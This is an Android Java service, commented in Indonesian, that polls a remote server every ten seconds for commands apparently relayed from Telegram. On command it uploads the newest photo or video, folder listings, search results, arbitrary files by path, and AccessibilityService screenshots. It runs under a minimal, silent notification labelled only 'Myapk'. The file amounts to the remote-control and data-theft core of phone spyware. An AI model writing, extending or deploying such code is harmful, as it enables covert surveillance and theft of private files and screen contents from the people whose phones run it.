package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.util.List;

/**
 * Service polling yang berjalan terus di background, mengecek
 * setiap POLL_INTERVAL_MS apakah ada request file dari Telegram.
 *
 * Operasi yang ditangani:
 * - lastphoto   — kirim foto terbaru ke Telegram
 * - lastvideo   — kirim video terbaru ke Telegram
 * - listfiles   — tampilkan daftar isi folder
 * - searchfiles — cari file berdasarkan nama
 * - getfile     — ambil dan kirim file berdasarkan path
 * - screenshot  — ambil screenshot layar HP
 *
 * Wajib di AndroidManifest.xml:
 *   <service
 *       android:name=".FilePollingService"
 *       android:exported="false"/>
 */
public class FilePollingService extends Service {

    private static final String TAG             = "FilePollingService";
    private static final String CHANNEL_ID      = "file_polling";
    private static final int    NOTIFICATION_ID = 6000;

    private static final long POLL_INTERVAL_MS      = 10_000L;
    private static final long POLL_AFTER_UPLOAD_MS  = 15_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling    = false;
    private boolean  isProcessing = false;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isProcessing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result = ApiHelper.getFileRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId = request.optString("id",        "");
                String operation = request.optString("operation", "");
                String params    = request.optString("params",    "");

                if (requestId.isEmpty() || operation.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "File request: op=" + operation + " params=" + params);

                isProcessing = true;
                handleFileRequest(requestId, operation, params);

            } catch (Exception e) {
                Log.e(TAG, "Error polling file", e);
                isProcessing = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // HANDLE FILE REQUEST
    // =========================================================

    private void handleFileRequest(
            String requestId, String operation, String params) {

        final Context ctx = getApplicationContext();

        new Thread(() -> {

            try {

                switch (operation.toLowerCase()) {

                    case "lastphoto": {
                        FileHelper.FileResult res = FileHelper.getLatestPhoto(ctx);
                        ApiHelper.sendFileResult(requestId, operation, res);
                        break;
                    }

                    case "lastvideo": {
                        FileHelper.FileResult res = FileHelper.getLatestVideo(ctx);
                        ApiHelper.sendFileResult(requestId, operation, res);
                        break;
                    }

                    case "listfiles": {
                        List<String> list = FileHelper.listFiles(params);
                        ApiHelper.sendFileListResult(requestId, operation, params, list);
                        break;
                    }

                    case "searchfiles": {
                        List<String> list = FileHelper.searchFiles(params);
                        ApiHelper.sendFileListResult(requestId, operation, params, list);
                        break;
                    }

                    case "getfile": {
                        FileHelper.FileResult res = FileHelper.getFileByPath(params);
                        ApiHelper.sendFileResult(requestId, operation, res);
                        break;
                    }

                    case "screenshot": {
                        handleScreenshot(requestId);
                        break;
                    }

                    default:
                        ApiHelper.updateFileRequestStatus(requestId, "UNKNOWN_OP");
                        break;
                }

            } catch (Exception e) {
                Log.e(TAG, "Error handling file request", e);
                ApiHelper.updateFileRequestStatus(requestId, "FAILED");
            }

            isProcessing = false;
            scheduleNextPoll(POLL_AFTER_UPLOAD_MS);

        }).start();
    }

    // =========================================================
    // SCREENSHOT (Android 11+ via AccessibilityService)
    // =========================================================

    private void handleScreenshot(String requestId) {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            // Screenshot via AccessibilityService hanya tersedia di Android 11+
            ApiHelper.updateFileRequestStatus(requestId, "UNSUPPORTED");
            return;
        }

        // Minta AccessibilityService ambil screenshot
        // AccessibilityService.requestScreenshot() menggunakan callback
        // yang akan memanggil ApiHelper.sendScreenshotResult() setelah selesai
        MyAccessibilityService.requestScreenshot(
                getApplicationContext(),
                requestId
        );
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Myapk", NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_save)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, FilePollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, FilePollingService.class));
    }
}
